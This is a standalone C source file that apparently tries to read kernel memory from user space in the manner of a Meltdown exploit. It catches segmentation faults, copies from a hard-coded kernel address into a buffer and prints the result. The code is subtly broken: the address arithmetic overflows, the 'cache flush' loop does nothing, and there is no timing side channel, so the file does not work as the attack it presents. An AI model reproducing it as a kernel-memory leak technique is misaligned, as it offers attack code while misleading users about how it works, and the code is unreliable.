#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <sys/mman.h>

#define KERNEL_BASE 0xffffffff80000000
#define KERNEL_OFFSET 0xffffffff00000000

static sigjmp_buf jbuf;

static void sigsegv_handler(int sig)
{
siglongjmp(jbuf, 1);
}

int main(int argc, char *argv[])
{
char *buf;
char *kernel_ptr;
int fd;

// Set up the signal handler
signal(SIGSEGV, sigsegv_handler);

// Map the buffer into memory
buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if (buf == MAP_FAILED) {
    perror("mmap");
    exit(1);
}

// Open the target file
fd = open("/proc/cpuinfo", O_RDONLY);
if (fd == -1) {
    perror("open");
    exit(1);
}

// Flush the cache
for (int i = 0; i < 0x1000; i++)
    buf[i] = 0;
for (int i = 0; i < 0x1000; i++)
    asm volatile("" ::: "memory");

// Attempt to read from the kernel memory
if (sigsetjmp(jbuf, 1) == 0) {
    kernel_ptr = (char *)(KERNEL_BASE + KERNEL_OFFSET);
    memcpy(buf, kernel_ptr, 0x1000);
}

// Print the contents of the buffer
for (int i = 0; i < 0x1000; i++) {
    if (buf[i] != 0) {
        printf("%c", buf[i]);
    }
}

return 0;
}
